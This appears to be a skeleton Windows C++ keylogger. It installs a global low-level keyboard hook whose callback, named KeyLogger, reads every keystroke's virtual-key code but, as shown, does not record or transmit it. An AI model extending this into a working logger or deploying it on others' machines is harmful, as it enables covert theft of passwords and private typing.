#include <fstream>
#include <iostream>
#include <windows.h>

HHOOK* hook;

LRESULT CALLBACK KeyLogger(int code, WPARAM wParam, LPARAM lParam) {
    KBDLLHOOKSTRUCT* vhStruct = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
    int virtualKey = vhStruct->vkCode;

    //std::cout << virtualKey << std::endl;


    return CallNextHookEx(*hook,code,wParam,lParam);
}



int main()
{
    std::cout << "Project startup\n";

    hook = new HHOOK();
    *hook = SetWindowsHookExA(WH_KEYBOARD_LL, KeyLogger, GetModuleHandle(nullptr), 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        if (GetAsyncKeyState('P') && GetAsyncKeyState('T'))
            std::cout << "t" << std::endl;
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}
